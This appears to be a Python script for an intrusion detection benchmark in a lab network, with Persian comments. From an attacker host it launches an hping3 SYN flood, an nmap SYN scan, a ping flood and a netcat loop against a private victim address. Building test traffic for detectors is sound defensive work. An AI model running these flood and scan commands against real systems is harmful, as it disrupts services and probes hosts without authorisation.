#!/usr/bin/env python3
"""
run_benchmarks.py - اسکریپت خودکارسازی سناریوهای تست حملات (مخصوص اجرا در xterm h1)
===================================================================
این اسکریپت مستقیماً روی خود هاست مهاجم (h1) اجرا می‌شود و ترافیک تولید می‌کند.
"""

import subprocess
import time
import sys

# آی‌پي قربانی (Victim)
VICTIM_IP = "10.0.0.2"

def run_cmd_direct(cmd):
    """اجرای مستقیم دستور در پس‌زمینه ترمینالِ جاری هاست h1"""
    print(f"[h1 Action] Running: {cmd}")
    # اجرای مستقیم دستور بدون mnexec چون داخل Namespace هاست h1 هستیم
    subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def main():
    print("==================================================")
    print("🚀 Starting Automated Intrusion Detection Benchmark (Inside h1)")
    print("==================================================")
    
    # --- فاز ۰: ترافیک نرمال اولیه ---
    print("\n🟢 Phase 0: Gathering Baseline Normal Traffic (30 seconds)...")
    for i in range(5):
        run_cmd_direct(f"ping -c 1 {VICTIM_IP}")
        time.sleep(6)

    # --- فاز ۱: حمله TCP SYN Flood ---
    print("\n⚔️ Phase 1: Launching TCP SYN Flood Attack...")
    run_cmd_direct(f"hping3 -S --flood -p 80 {VICTIM_IP}")
    time.sleep(15) 
    
    print("🛑 Stopping SYN Flood...")
    subprocess.run(["sudo", "killall", "hping3"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    print("⏳ Cooling down (10s)...")
    time.sleep(10)

    # --- فاز ۲: حمله Port Scanning ---
    print("\n⚔️ Phase 2: Launching TCP SYN Port Scan...")
    run_cmd_direct(f"nmap -sS -p 1-100 --max-rate 15 {VICTIM_IP}")
    time.sleep(15) 
    
    print("⏳ Cooling down (10s)...")
    time.sleep(10)

    # --- فاز ۳: حمله ICMP Flood ---
    print("\n⚔️ Phase 3: Launching ICMP Flood Attack...")
    run_cmd_direct(f"ping -f -c 50 {VICTIM_IP}")
    time.sleep(5) 
    
    print("⏳ Cooling down (10s)...")
    time.sleep(10)

    # --- فاز ۴: حمله SSH Brute-Force ---
    print("\n⚔️ Phase 4: Launching SSH Brute-Force Simulation...")
    nc_loop = f'bash -c "for i in {{1..12}}; do nc -w 1 {VICTIM_IP} 22; done"'
    run_cmd_direct(nc_loop)
    time.sleep(15)

    print("\n==================================================")
    print("✅ Benchmark Finished Successfully!")
    print("==================================================")

if __name__ == "__main__":
    main()